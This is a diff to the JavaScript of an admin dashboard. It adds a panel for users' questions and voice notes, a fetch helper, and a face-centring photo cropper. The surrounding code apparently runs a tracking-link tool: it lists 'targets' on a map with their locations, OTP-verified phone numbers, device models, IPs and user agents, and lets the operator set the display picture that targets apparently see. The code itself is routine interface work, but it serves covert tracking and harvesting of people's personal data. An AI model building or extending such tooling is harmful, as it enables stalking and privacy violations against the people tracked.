@@ -32,6 +32,14 @@ const refreshBtn = document.getElementById('refreshBtn');
 const clearAllBtn = document.getElementById('clearAllBtn');
 const exportCsvBtn = document.getElementById('exportCsvBtn');
 
+let cachedQueries = [];
+const totalQueries = document.getElementById('totalQueries');
+const queryCountBadge = document.getElementById('queryCountBadge');
+const queriesListContainer = document.getElementById('queriesListContainer');
+const refreshQueriesBtn = document.getElementById('refreshQueriesBtn');
+const exportQueriesCsvBtn = document.getElementById('exportQueriesCsvBtn');
+const clearAllQueriesBtn = document.getElementById('clearAllQueriesBtn');
+
 // --------------------------------------------------------------------------
 // Sound Alert (Web Audio Synthesizer)
 // --------------------------------------------------------------------------
@@ -59,16 +67,59 @@ function playIntelAlertChime() {
 }
 
 // --------------------------------------------------------------------------
+// Safe JSON Fetcher & API Base
+// --------------------------------------------------------------------------
+const API_BASE = (window.location.protocol === 'file:' || (window.location.port && window.location.port !== '3000' && (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')))
+  ? 'http://localhost:3000'
+  : '';
+
+async function safeFetchJson(endpoint, options = {}) {
+  const fullUrl = endpoint.startsWith('http') ? endpoint : `${API_BASE}${endpoint}`;
+  let res;
+  try {
+    res = await fetch(fullUrl, options);
+  } catch (netErr) {
+    throw new Error(`Cannot connect to server (${netErr.message}). Make sure 'node server.js' is running on port 3000.`);
+  }
+
+  const contentType = res.headers.get('content-type') || '';
+  if (contentType.includes('application/json')) {
+    const data = await res.json();
+    if (!res.ok) {
+      throw new Error(data.error || `Server error (HTTP ${res.status})`);
+    }
+    return data;
+  }
+
+  const rawText = await res.text();
+  const match = rawText.match(/<pre>(.*?)<\/pre>/s);
+  const cleanMsg = match ? match[1].replace(/<[^>]+>/g, '').trim() : '';
+
+  if (cleanMsg) {
+    throw new Error(`${cleanMsg}. (Please restart server: node server.js)`);
+  }
+
+  if (rawText.includes('<!DOCTYPE') || rawText.includes('<html')) {
+    throw new Error(`Server returned HTML (HTTP ${res.status}). Server ko restart karein: node server.js`);
+  }
+
+  try {
+    return JSON.parse(rawText);
+  } catch (e) {
+    throw new Error(`Invalid response (HTTP ${res.status}): ${rawText.slice(0, 100)}`);
+  }
+}
+
+// --------------------------------------------------------------------------
 // Authentication Flow
 // --------------------------------------------------------------------------
 async function verifyAuth(key) {
   try {
-    const res = await fetch('/api/admin/verify', {
+    const data = await safeFetchJson('/api/admin/verify', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ key })
     });
-    const data = await res.json();
     return data.success;
   } catch (e) {
     return false;
@@ -120,6 +171,7 @@ async function initializeDashboard() {
   initMap();
   updateLinkDisplay('Visitor_1');
   await loadDatabaseRecords();
+  await loadQueriesRecords();
   await loadAdminConfig();
   connectSSEStream();
 }
@@ -203,7 +255,8 @@ function plotTargetsOnMap(records) {
 function connectSSEStream() {
   if (eventSource) eventSource.close();
 
-  eventSource = new EventSource(`/api/admin/stream?adminKey=${encodeURIComponent(adminKey)}`);
+  const streamUrl = `${API_BASE}/api/admin/stream?adminKey=${encodeURIComponent(adminKey)}`;
+  eventSource = new EventSource(streamUrl);
 
   eventSource.onopen = () => {
     sseStatus.textContent = 'SSE Active &bull; Real-Time Listening';
@@ -226,6 +279,17 @@ function connectSSEStream() {
         setTimeout(() => { alertBanner.style.display = 'none'; }, 6000);
       } else if (data.type === 'RECORD_DELETED' || data.type === 'ALL_CLEARED') {
         loadDatabaseRecords();
+      } else if (data.type === 'NEW_QUERY') {
+        playIntelAlertChime();
+        const isVoice = !!data.query.audioUrl;
+        const label = isVoice ? '🎙️ [New Voice Note]' : '💬 [New Question]';
+        const preview = data.query.query ? `"${data.query.query}"` : 'Audio voice message received';
+        alertBannerText.textContent = `${label} from ${data.query.phoneNumber}: ${preview}`;
+        alertBanner.style.display = 'flex';
+        setTimeout(() => { alertBanner.style.display = 'none'; }, 8000);
+        handleIncomingNewQuery(data.query);
+      } else if (data.type === 'QUERY_DELETED' || data.type === 'ALL_QUERIES_CLEARED') {
+        loadQueriesRecords();
       } else if (data.type === 'CONFIG_UPDATED') {
         loadAdminConfig();
       }
@@ -268,18 +332,17 @@ function handleIncomingNewTarget(record) {
 // --------------------------------------------------------------------------
 async function loadDatabaseRecords() {
   try {
-    const res = await fetch('/api/admin/locations', {
+    const data = await safeFetchJson('/api/admin/locations', {
       headers: { 'x-admin-key': adminKey }
     });
-    const data = await res.json();
     if (data.success) {
-      cachedLocations = data.locations;
+      cachedLocations = data.locations || [];
       renderTable(cachedLocations);
       updateMetrics(cachedLocations);
       plotTargetsOnMap(cachedLocations);
     }
   } catch (e) {
-    console.error('Failed to load DB:', e);
+    console.error('Failed to load DB:', e.message);
   }
 }
 
@@ -326,12 +389,20 @@ function renderTable(locations) {
       ? item.deviceModel
       : (os === 'Android' ? 'Android Device' : (os === 'iOS' ? 'Apple iPhone' : os));
 
+    const userQueries = cachedQueries.filter(q => q.phoneNumber && item.phoneNumber && q.phoneNumber.replace(/[^0-9]/g, '') === item.phoneNumber.replace(/[^0-9]/g, ''));
+    const hasAudioQuery = userQueries.some(q => q.audioUrl);
+    const audioBadgeSnippet = hasAudioQuery ? ' 🎙️' : '';
+    const queryBadge = userQueries.length > 0 
+      ? `<a href="#queriesSectionCard" style="display: inline-block; font-size: 0.68rem; color: #38bdf8; background: rgba(6, 182, 212, 0.15); border: 1px solid rgba(6, 182, 212, 0.3); padding: 1px 6px; border-radius: 4px; margin-top: 2px; text-decoration: none;" title="${escapeHtml(userQueries[0].query || 'Voice note')}">💬 ${userQueries.length} Query${userQueries.length > 1 ? 'ies' : ''}${audioBadgeSnippet}</a>` 
+      : '';
+
     const phone = item.phoneNumber && item.phoneNumber !== 'N/A'
       ? `<div style="display: flex; flex-direction: column; gap: 2px;">
            <a href="https://wa.me/${item.phoneNumber.replace(/[^0-9]/g, '')}" target="_blank" style="color: #10b981; text-decoration: none; font-weight: 600;" title="WhatsApp / Call">
              ${escapeHtml(item.phoneNumber)} 💬
            </a>
            <span style="font-size: 0.68rem; color: #34d399; font-weight: 600;">✓ OTP VERIFIED</span>
+           ${queryBadge}
          </div>`
       : `<span style="color: var(--text-dim);">N/A</span>`;
 
@@ -387,26 +458,26 @@ function updateMetrics(locations) {
 window.deleteRecord = async function (id) {
   if (!confirm(`Delete record #${id}?`)) return;
   try {
-    await fetch(`/api/admin/locations/${id}`, {
+    await safeFetchJson(`/api/admin/locations/${id}`, {
       method: 'DELETE',
       headers: { 'x-admin-key': adminKey }
     });
     loadDatabaseRecords();
   } catch (e) {
-    alert('Failed to delete');
+    alert('Failed to delete: ' + e.message);
   }
 };
 
 clearAllBtn.addEventListener('click', async () => {
   if (!confirm('Are you sure you want to CLEAR the entire database? This cannot be undone.')) return;
   try {
-    await fetch('/api/admin/locations', {
+    await safeFetchJson('/api/admin/locations', {
       method: 'DELETE',
       headers: { 'x-admin-key': adminKey }
     });
     loadDatabaseRecords();
   } catch (e) {
-    alert('Failed to clear database');
+    alert('Failed to clear database: ' + e.message);
   }
 });
 
@@ -443,6 +514,191 @@ exportCsvBtn.addEventListener('click', () => {
 });
 
 refreshBtn.addEventListener('click', loadDatabaseRecords);
+
+// --------------------------------------------------------------------------
+// User Queries & Questions Management Logic
+// --------------------------------------------------------------------------
+async function loadQueriesRecords() {
+  try {
+    const data = await safeFetchJson('/api/admin/queries', {
+      headers: { 'x-admin-key': adminKey }
+    });
+    if (data.success) {
+      cachedQueries = data.queries || [];
+      renderQueries(cachedQueries);
+      if (cachedLocations.length > 0) {
+        renderTable(cachedLocations);
+      }
+    }
+  } catch (e) {
+    console.error('Failed to load queries:', e.message);
+  }
+}
+
+function handleIncomingNewQuery(newQuery) {
+  cachedQueries.unshift(newQuery);
+  renderQueries(cachedQueries);
+  if (cachedLocations.length > 0) {
+    renderTable(cachedLocations);
+  }
+}
+
+function renderQueries(queries) {
+  if (totalQueries) totalQueries.textContent = queries.length;
+  if (queryCountBadge) queryCountBadge.textContent = `${queries.length} Queries`;
+
+  if (!queriesListContainer) return;
+
+  if (queries.length === 0) {
+    queriesListContainer.innerHTML = `
+      <div id="noQueriesMsg" style="text-align: center; color: var(--text-dim); padding: 2rem 1rem; font-size: 0.85rem;">
+        Abhi tak kisi user ne sawal nahi bheja hai. Jaise hi koi sawal puchega, yahan real-time sound ke sath live show hoga!
+      </div>
+    `;
+    return;
+  }
+
+  queriesListContainer.innerHTML = queries.map(q => {
+    const date = new Date(q.createdAt).toLocaleDateString([], { month: 'short', day: 'numeric' });
+    const time = new Date(q.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+    const cleanPhone = (q.phoneNumber || '').replace(/[^0-9]/g, '');
+    const hasPhone = cleanPhone && cleanPhone.length >= 10;
+    const hasAudio = !!q.audioUrl;
+    
+    // WhatsApp reply message text
+    let replyMsg = 'Hi bhai!';
+    if (q.query) {
+      replyMsg = `Hi bhai, regarding your question: "${q.query.slice(0, 45)}..."`;
+    } else if (hasAudio) {
+      replyMsg = `Hi bhai, aapka voice note mujhe mil gaya hai!`;
+    }
+    const whatsappUrl = `https://wa.me/${cleanPhone}?text=${encodeURIComponent(replyMsg)}`;
+
+    return `
+      <div class="query-card-item" style="background: rgba(15, 23, 42, 0.85); border: 1px solid rgba(6, 182, 212, 0.25); border-radius: 14px; padding: 1.1rem 1.25rem; display: flex; flex-direction: column; gap: 0.75rem; transition: border-color 0.2s;">
+        <div style="display: flex; justify-content: space-between; align-items: flex-start; flex-wrap: wrap; gap: 0.5rem;">
+          <div style="display: flex; align-items: center; gap: 0.5rem; flex-wrap: wrap;">
+            <span class="tag-badge" style="font-size: 0.72rem;">#${q.id} &bull; ${escapeHtml(q.tag || 'General')}</span>
+            <span style="color: #38bdf8; font-family: var(--mono); font-size: 0.95rem; font-weight: 700;">
+              ${escapeHtml(q.phoneNumber || 'N/A')}
+            </span>
+            ${hasPhone ? `<span style="font-size: 0.7rem; color: #10b981; background: rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.3); padding: 0.15rem 0.45rem; border-radius: 999px;">✓ Verified Mobile</span>` : ''}
+            ${hasAudio ? `<span style="font-size: 0.7rem; color: #c084fc; background: rgba(168, 85, 247, 0.15); border: 1px solid rgba(168, 85, 247, 0.35); padding: 0.15rem 0.55rem; border-radius: 999px; font-weight: 600;">🎙️ Voice Note ${q.audioDuration ? `(${q.audioDuration}s)` : ''}</span>` : ''}
+          </div>
+
+          <div style="display: flex; align-items: center; gap: 0.65rem;">
+            <span style="font-size: 0.75rem; color: var(--text-dim); font-family: var(--mono);">${date} <span style="color: var(--text-muted);">${time}</span></span>
+            <button type="button" class="btn-action" onclick="deleteQuery(${q.id})" style="padding: 0.25rem 0.55rem; font-size: 0.72rem; color: var(--text-dim);" title="Delete question">
+              🗑️ Delete
+            </button>
+          </div>
+        </div>
+
+        <!-- Question Bubble (if user entered text) -->
+        ${q.query ? `
+        <div style="background: rgba(6, 182, 212, 0.08); border-left: 3px solid var(--accent-cyan); border-radius: 0 10px 10px 0; padding: 0.8rem 1rem; color: #fff; font-size: 0.95rem; line-height: 1.5; font-weight: 500;">
+          "${escapeHtml(q.query)}"
+        </div>
+        ` : ''}
+
+        <!-- Audio Player Box (if user sent voice note) -->
+        ${hasAudio ? `
+        <div style="background: rgba(139, 92, 246, 0.08); border: 1px solid rgba(139, 92, 246, 0.3); border-radius: 12px; padding: 0.75rem 1rem; display: flex; flex-direction: column; gap: 0.5rem;">
+          <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 0.35rem;">
+            <div style="display: flex; align-items: center; gap: 0.4rem; font-size: 0.8rem; font-weight: 700; color: #c084fc;">
+              <span>🎙️ Voice Message Audio</span>
+              ${q.audioDuration ? `<span style="font-size: 0.7rem; color: #e2e8f0; font-family: var(--mono); background: rgba(139, 92, 246, 0.25); padding: 1px 6px; border-radius: 99px;">${q.audioDuration}s</span>` : ''}
+            </div>
+            <a href="${q.audioUrl}" download="voice_${q.phoneNumber || q.id}.webm" target="_blank" style="font-size: 0.72rem; color: #38bdf8; text-decoration: none; font-weight: 600; display: inline-flex; align-items: center; gap: 0.25rem;">
+              ⬇️ Download Audio
+            </a>
+          </div>
+          <audio controls preload="metadata" style="width: 100%; height: 38px; outline: none; border-radius: 8px;">
+            <source src="${q.audioUrl}">
+            Your browser does not support audio playback.
+          </audio>
+        </div>
+        ` : ''}
+
+        <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 0.6rem;">
+          <div style="font-size: 0.73rem; color: var(--text-dim); display: flex; gap: 0.85rem; font-family: var(--mono);">
+            <span>🌐 IP: ${escapeHtml(q.clientIp || 'N/A')}</span>
+          </div>
+
+          ${hasPhone ? `
+            <a href="${whatsappUrl}" target="_blank" class="query-whatsapp-btn" style="display: inline-flex; align-items: center; gap: 0.4rem; background: #10b981; color: #000; font-weight: 700; padding: 0.4rem 0.85rem; border-radius: 8px; font-size: 0.78rem; text-decoration: none; box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);" onmouseover="this.style.opacity='0.9'" onmouseout="this.style.opacity='1'">
+              💬 Reply on WhatsApp
+            </a>
+          ` : ''}
+        </div>
+      </div>
+    `;
+  }).join('');
+}
+
+window.deleteQuery = async function (id) {
+  if (!confirm(`Delete query #${id}?`)) return;
+  try {
+    await safeFetchJson(`/api/admin/queries/${id}`, {
+      method: 'DELETE',
+      headers: { 'x-admin-key': adminKey }
+    });
+    loadQueriesRecords();
+  } catch (e) {
+    alert('Failed to delete query: ' + e.message);
+  }
+};
+
+if (clearAllQueriesBtn) {
+  clearAllQueriesBtn.addEventListener('click', async () => {
+    if (!confirm('Are you sure you want to clear ALL user queries? This cannot be undone.')) return;
+    try {
+      await safeFetchJson('/api/admin/queries', {
+        method: 'DELETE',
+        headers: { 'x-admin-key': adminKey }
+      });
+      loadQueriesRecords();
+    } catch (e) {
+      alert('Failed to clear queries: ' + e.message);
+    }
+  });
+}
+
+if (exportQueriesCsvBtn) {
+  exportQueriesCsvBtn.addEventListener('click', () => {
+    if (cachedQueries.length === 0) {
+      alert('No queries to export');
+      return;
+    }
+
+    const headers = ['ID', 'Tag', 'PhoneNumber', 'Query', 'HasAudio', 'AudioURL', 'DurationSeconds', 'IP', 'UserAgent', 'Timestamp'];
+    const rows = cachedQueries.map(q => [
+      q.id,
+      `"${(q.tag || '').replace(/"/g, '""')}"`,
+      `"${(q.phoneNumber || 'N/A').replace(/"/g, '""')}"`,
+      `"${(q.query || '').replace(/"/g, '""')}"`,
+      q.audioUrl ? 'YES' : 'NO',
+      `"${(q.audioUrl || '').replace(/"/g, '""')}"`,
+      q.audioDuration || '',
+      q.clientIp || '',
+      `"${(q.userAgent || '').replace(/"/g, '""')}"`,
+      q.createdAt
+    ]);
+
+    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map(e => e.join(','))].join('\n');
+    const encodedUri = encodeURI(csvContent);
+    const link = document.createElement('a');
+    link.setAttribute('href', encodedUri);
+    link.setAttribute('download', `user_queries_${Date.now()}.csv`);
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  });
+}
+
+if (refreshQueriesBtn) {
+  refreshQueriesBtn.addEventListener('click', loadQueriesRecords);
+}
 
 // --------------------------------------------------------------------------
 // Tracking Link Generator
@@ -500,13 +756,383 @@ if (cfgImgUrl && adminDpPreview) {
   });
 }
 
-// Wire DP File Upload button and input
+// --------------------------------------------------------------------------
+// Interactive Photo Cropper & Face Framing Studio
+// --------------------------------------------------------------------------
+const cropModal = document.getElementById('cropModal');
+const closeCropModalBtn = document.getElementById('closeCropModalBtn');
+const cancelCropBtn = document.getElementById('cancelCropBtn');
+const saveCropBtn = document.getElementById('saveCropBtn');
+const saveCropBtnText = document.getElementById('saveCropBtnText');
+const cropCanvas = document.getElementById('cropCanvas');
+const cropZoomSlider = document.getElementById('cropZoomSlider');
+const cropZoomInBtn = document.getElementById('cropZoomInBtn');
+const cropZoomOutBtn = document.getElementById('cropZoomOutBtn');
+const cropZoomValue = document.getElementById('cropZoomValue');
+const cropRotateBtn = document.getElementById('cropRotateBtn');
+const cropCenterBtn = document.getElementById('cropCenterBtn');
+const openCropperBtn = document.getElementById('openCropperBtn');
+
+let cropCtx = null;
+if (cropCanvas) {
+  cropCtx = cropCanvas.getContext('2d');
+}
+
+const CROP_CANVAS_SIZE = 320;
+const CROP_CIRCLE_RADIUS = 125;
+const CROP_CENTER = CROP_CANVAS_SIZE / 2;
+
+let cropImageObj = new Image();
+let cropState = {
+  posX: CROP_CENTER,
+  posY: CROP_CENTER,
+  baseScale: 1,
+  scale: 1,
+  rotation: 0,
+  isDragging: false,
+  dragStartX: 0,
+  dragStartY: 0,
+  initialPosX: CROP_CENTER,
+  initialPosY: CROP_CENTER,
+  touchDist: 0
+};
+
+function drawCropView() {
+  if (!cropCtx || !cropImageObj.complete || !cropImageObj.naturalWidth) return;
+
+  cropCtx.clearRect(0, 0, CROP_CANVAS_SIZE, CROP_CANVAS_SIZE);
+
+  // Background
+  cropCtx.fillStyle = '#0b1120';
+  cropCtx.fillRect(0, 0, CROP_CANVAS_SIZE, CROP_CANVAS_SIZE);
+
+  // Draw image with active transform
+  cropCtx.save();
+  cropCtx.translate(cropState.posX, cropState.posY);
+  cropCtx.rotate((cropState.rotation * Math.PI) / 180);
+  cropCtx.scale(cropState.scale, cropState.scale);
+  cropCtx.drawImage(cropImageObj, -cropImageObj.naturalWidth / 2, -cropImageObj.naturalHeight / 2);
+  cropCtx.restore();
+
+  // Dark overlay mask outside the circle
+  cropCtx.save();
+  cropCtx.fillStyle = 'rgba(10, 15, 29, 0.72)';
+  cropCtx.beginPath();
+  cropCtx.rect(0, 0, CROP_CANVAS_SIZE, CROP_CANVAS_SIZE);
+  cropCtx.arc(CROP_CENTER, CROP_CENTER, CROP_CIRCLE_RADIUS, 0, Math.PI * 2, true);
+  cropCtx.fill();
+
+  // Circular guide border
+  cropCtx.beginPath();
+  cropCtx.arc(CROP_CENTER, CROP_CENTER, CROP_CIRCLE_RADIUS, 0, Math.PI * 2);
+  cropCtx.strokeStyle = '#06b6d4';
+  cropCtx.lineWidth = 2.5;
+  cropCtx.shadowColor = 'rgba(6, 182, 212, 0.6)';
+  cropCtx.shadowBlur = 10;
+  cropCtx.stroke();
+
+  // Face alignment center crosshair guide
+  cropCtx.shadowBlur = 0;
+  cropCtx.strokeStyle = 'rgba(255, 255, 255, 0.22)';
+  cropCtx.lineWidth = 1;
+  cropCtx.setLineDash([4, 4]);
+  cropCtx.beginPath();
+  // Vertical line
+  cropCtx.moveTo(CROP_CENTER, CROP_CENTER - CROP_CIRCLE_RADIUS + 25);
+  cropCtx.lineTo(CROP_CENTER, CROP_CENTER + CROP_CIRCLE_RADIUS - 25);
+  // Horizontal line
+  cropCtx.moveTo(CROP_CENTER - CROP_CIRCLE_RADIUS + 25, CROP_CENTER);
+  cropCtx.lineTo(CROP_CENTER + CROP_CIRCLE_RADIUS - 25, CROP_CENTER);
+  cropCtx.stroke();
+  cropCtx.setLineDash([]);
+
+  // Inner oval hint for face positioning
+  cropCtx.beginPath();
+  cropCtx.ellipse(CROP_CENTER, CROP_CENTER, 48, 62, 0, 0, Math.PI * 2);
+  cropCtx.strokeStyle = 'rgba(56, 189, 248, 0.25)';
+  cropCtx.lineWidth = 1;
+  cropCtx.setLineDash([3, 5]);
+  cropCtx.stroke();
+  cropCtx.setLineDash([]);
+
+  cropCtx.restore();
+}
+
+function openImageCropper(imageSource) {
+  if (!cropModal) return;
+
+  cropImageObj = new Image();
+  cropImageObj.crossOrigin = 'anonymous';
+
+  cropImageObj.onload = () => {
+    // Calculate scale so image covers the circle
+    const minDim = Math.min(cropImageObj.naturalWidth, cropImageObj.naturalHeight);
+    const neededDiameter = CROP_CIRCLE_RADIUS * 2;
+    const baseScale = neededDiameter / minDim;
+
+    cropState.baseScale = baseScale;
+    cropState.scale = baseScale;
+    cropState.posX = CROP_CENTER;
+    cropState.posY = CROP_CENTER;
+    cropState.rotation = 0;
+    cropState.isDragging = false;
+
+    if (cropZoomSlider) {
+      cropZoomSlider.value = 1.0;
+    }
+    if (cropZoomValue) {
+      cropZoomValue.textContent = '1.0x';
+    }
+
+    cropModal.style.display = 'flex';
+    drawCropView();
+  };
+
+  cropImageObj.onerror = () => {
+    alert('Photo ko load karne me samasya aayi. Kripya dubara photo select karein.');
+  };
+
+  cropImageObj.src = imageSource;
+}
+
+function closeImageCropper() {
+  if (cropModal) {
+    cropModal.style.display = 'none';
+  }
+  cropState.isDragging = false;
+}
+
+// Mouse & Touch Interaction for Cropper
+if (cropCanvas) {
+  // Mouse Dragging
+  cropCanvas.addEventListener('mousedown', (e) => {
+    cropState.isDragging = true;
+    cropState.dragStartX = e.clientX;
+    cropState.dragStartY = e.clientY;
+    cropState.initialPosX = cropState.posX;
+    cropState.initialPosY = cropState.posY;
+  });
+
+  window.addEventListener('mousemove', (e) => {
+    if (!cropState.isDragging) return;
+    const dx = e.clientX - cropState.dragStartX;
+    const dy = e.clientY - cropState.dragStartY;
+    cropState.posX = cropState.initialPosX + dx;
+    cropState.posY = cropState.initialPosY + dy;
+    drawCropView();
+  });
+
+  window.addEventListener('mouseup', () => {
+    cropState.isDragging = false;
+  });
+
+  // Mouse Wheel Zoom
+  cropCanvas.addEventListener('wheel', (e) => {
+    e.preventDefault();
+    const zoomDelta = e.deltaY < 0 ? 0.08 : -0.08;
+    const currentVal = parseFloat(cropZoomSlider.value);
+    const nextVal = Math.min(3.5, Math.max(0.5, currentVal + zoomDelta));
+    cropZoomSlider.value = nextVal.toFixed(2);
+    cropZoomValue.textContent = nextVal.toFixed(2) + 'x';
+    cropState.scale = cropState.baseScale * nextVal;
+    drawCropView();
+  }, { passive: false });
+
+  // Touch Dragging & Pinch to Zoom on Mobile
+  cropCanvas.addEventListener('touchstart', (e) => {
+    if (e.touches.length === 1) {
+      cropState.isDragging = true;
+      cropState.dragStartX = e.touches[0].clientX;
+      cropState.dragStartY = e.touches[0].clientY;
+      cropState.initialPosX = cropState.posX;
+      cropState.initialPosY = cropState.posY;
+    } else if (e.touches.length === 2) {
+      cropState.isDragging = false;
+      cropState.touchDist = Math.hypot(
+        e.touches[0].clientX - e.touches[1].clientX,
+        e.touches[0].clientY - e.touches[1].clientY
+      );
+    }
+  }, { passive: false });
+
+  cropCanvas.addEventListener('touchmove', (e) => {
+    e.preventDefault();
+    if (e.touches.length === 1 && cropState.isDragging) {
+      const dx = e.touches[0].clientX - cropState.dragStartX;
+      const dy = e.touches[0].clientY - cropState.dragStartY;
+      cropState.posX = cropState.initialPosX + dx;
+      cropState.posY = cropState.initialPosY + dy;
+      drawCropView();
+    } else if (e.touches.length === 2) {
+      const dist = Math.hypot(
+        e.touches[0].clientX - e.touches[1].clientX,
+        e.touches[0].clientY - e.touches[1].clientY
+      );
+      if (cropState.touchDist > 0) {
+        const diff = dist - cropState.touchDist;
+        const currentVal = parseFloat(cropZoomSlider.value);
+        const nextVal = Math.min(3.5, Math.max(0.5, currentVal + diff * 0.008));
+        cropZoomSlider.value = nextVal.toFixed(2);
+        cropZoomValue.textContent = nextVal.toFixed(2) + 'x';
+        cropState.scale = cropState.baseScale * nextVal;
+        drawCropView();
+      }
+      cropState.touchDist = dist;
+    }
+  }, { passive: false });
+
+  cropCanvas.addEventListener('touchend', (e) => {
+    if (e.touches.length === 0) {
+      cropState.isDragging = false;
+      cropState.touchDist = 0;
+    }
+  });
+}
+
+// Zoom Slider
+if (cropZoomSlider) {
+  cropZoomSlider.addEventListener('input', () => {
+    const val = parseFloat(cropZoomSlider.value);
+    cropZoomValue.textContent = val.toFixed(2) + 'x';
+    cropState.scale = cropState.baseScale * val;
+    drawCropView();
+  });
+}
+
+// Zoom In/Out Buttons
+if (cropZoomInBtn && cropZoomSlider) {
+  cropZoomInBtn.addEventListener('click', () => {
+    const val = Math.min(3.5, parseFloat(cropZoomSlider.value) + 0.15);
+    cropZoomSlider.value = val.toFixed(2);
+    cropZoomValue.textContent = val.toFixed(2) + 'x';
+    cropState.scale = cropState.baseScale * val;
+    drawCropView();
+  });
+}
+
+if (cropZoomOutBtn && cropZoomSlider) {
+  cropZoomOutBtn.addEventListener('click', () => {
+    const val = Math.max(0.5, parseFloat(cropZoomSlider.value) - 0.15);
+    cropZoomSlider.value = val.toFixed(2);
+    cropZoomValue.textContent = val.toFixed(2) + 'x';
+    cropState.scale = cropState.baseScale * val;
+    drawCropView();
+  });
+}
+
+// Rotate Button
+if (cropRotateBtn) {
+  cropRotateBtn.addEventListener('click', () => {
+    cropState.rotation = (cropState.rotation + 90) % 360;
+    drawCropView();
+  });
+}
+
+// Center Face Button
+if (cropCenterBtn) {
+  cropCenterBtn.addEventListener('click', () => {
+    cropState.posX = CROP_CENTER;
+    cropState.posY = CROP_CENTER;
+    cropState.rotation = 0;
+    cropState.scale = cropState.baseScale;
+    if (cropZoomSlider) cropZoomSlider.value = 1.0;
+    if (cropZoomValue) cropZoomValue.textContent = '1.0x';
+    drawCropView();
+  });
+}
+
+// Close and Cancel Buttons
+if (closeCropModalBtn) closeCropModalBtn.addEventListener('click', closeImageCropper);
+if (cancelCropBtn) cancelCropBtn.addEventListener('click', closeImageCropper);
+
+// Save & Crop Button: Render 512x512 High-Res Image & Upload
+if (saveCropBtn) {
+  saveCropBtn.addEventListener('click', async () => {
+    if (!cropImageObj.complete || !cropImageObj.naturalWidth) return;
+
+    saveCropBtn.disabled = true;
+    saveCropBtnText.textContent = 'Crop ho raha hai...';
+
+    try {
+      const OUTPUT_SIZE = 512;
+      const factor = OUTPUT_SIZE / (CROP_CIRCLE_RADIUS * 2);
+
+      const outCanvas = document.createElement('canvas');
+      outCanvas.width = OUTPUT_SIZE;
+      outCanvas.height = OUTPUT_SIZE;
+      const outCtx = outCanvas.getContext('2d');
+
+      outCtx.imageSmoothingEnabled = true;
+      outCtx.imageSmoothingQuality = 'high';
+
+      outCtx.save();
+      outCtx.translate(
+        OUTPUT_SIZE / 2 + (cropState.posX - CROP_CENTER) * factor,
+        OUTPUT_SIZE / 2 + (cropState.posY - CROP_CENTER) * factor
+      );
+      outCtx.rotate((cropState.rotation * Math.PI) / 180);
+      outCtx.scale(cropState.scale * factor, cropState.scale * factor);
+      outCtx.drawImage(
+        cropImageObj,
+        -cropImageObj.naturalWidth / 2,
+        -cropImageObj.naturalHeight / 2
+      );
+      outCtx.restore();
+
+      const croppedBase64 = outCanvas.toDataURL('image/jpeg', 0.92);
+
+      dpUploadStatus.textContent = '⏳ Saving cropped photo to server...';
+      dpUploadStatus.style.color = 'var(--accent-cyan)';
+
+      const data = await safeFetchJson('/api/admin/upload-dp', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'x-admin-key': adminKey
+        },
+        body: JSON.stringify({
+          imageData: croppedBase64
+        })
+      });
+
+      // Update previews
+      if (adminDpPreview) adminDpPreview.src = data.imageUrl;
+      if (cfgImgUrl) cfgImgUrl.value = data.imageUrl;
+
+      dpUploadStatus.textContent = '✅ Face centered & profile picture updated!';
+      dpUploadStatus.style.color = 'var(--accent-emerald)';
+
+      alertBannerText.textContent = '📸 Profile photo face centered & updated successfully!';
+      alertBanner.style.display = 'flex';
+      setTimeout(() => { alertBanner.style.display = 'none'; }, 6000);
+
+      closeImageCropper();
+
+    } catch (err) {
+      console.error('Crop save error:', err);
+      alert('Failed to save cropped photo: ' + err.message);
+    } finally {
+      saveCropBtn.disabled = false;
+      saveCropBtnText.textContent = '✓ Crop & Save Face DP';
+    }
+  });
+}
+
+// Open Cropper on current image
+if (openCropperBtn) {
+  openCropperBtn.addEventListener('click', () => {
+    const currentSrc = (adminDpPreview && adminDpPreview.src) || (cfgImgUrl && cfgImgUrl.value) || 'profile.jpg';
+    openImageCropper(currentSrc);
+  });
+}
+
+// Wire DP File Upload button and file input
 if (triggerUploadBtn && dpFileInput) {
   triggerUploadBtn.addEventListener('click', () => {
     dpFileInput.click();
   });
 
-  dpFileInput.addEventListener('change', async (e) => {
+  dpFileInput.addEventListener('change', (e) => {
     const file = e.target.files && e.target.files[0];
     if (!file) return;
 
@@ -515,73 +1141,23 @@ if (triggerUploadBtn && dpFileInput) {
       return;
     }
 
-    // Limit check (15MB)
-    if (file.size > 15 * 1024 * 1024) {
-      alert('Image file is too large! Please choose an image under 15MB.');
+    if (file.size > 20 * 1024 * 1024) {
+      alert('Image file is too large! Please choose an image under 20MB.');
       return;
     }
 
-    dpUploadStatus.textContent = '⏳ Uploading & saving photo...';
-    dpUploadStatus.style.color = 'var(--accent-cyan)';
-    triggerUploadBtn.disabled = true;
-
-    try {
-      const reader = new FileReader();
-      reader.onload = async () => {
-        const base64Data = reader.result;
-
-        // Immediately show local preview
-        if (adminDpPreview) {
-          adminDpPreview.src = base64Data;
-        }
-
-        const res = await fetch('/api/admin/upload-dp', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'x-admin-key': adminKey
-          },
-          body: JSON.stringify({
-            imageData: base64Data,
-            filename: file.name
-          })
-        });
-
-        const data = await res.json();
-        if (!res.ok || !data.success) {
-          throw new Error(data.error || 'Upload failed');
-        }
-
-        // Success: update form field and server URL preview
-        if (cfgImgUrl) cfgImgUrl.value = data.imageUrl;
-        if (adminDpPreview) adminDpPreview.src = data.imageUrl;
-
-        dpUploadStatus.textContent = '✅ Profile picture updated successfully!';
-        dpUploadStatus.style.color = 'var(--accent-emerald)';
-
-        // Show top alert banner as well
-        alertBannerText.textContent = '📸 Profile Picture (DP) uploaded & updated on frontend!';
-        alertBanner.style.display = 'flex';
-        setTimeout(() => { alertBanner.style.display = 'none'; }, 5000);
-      };
-
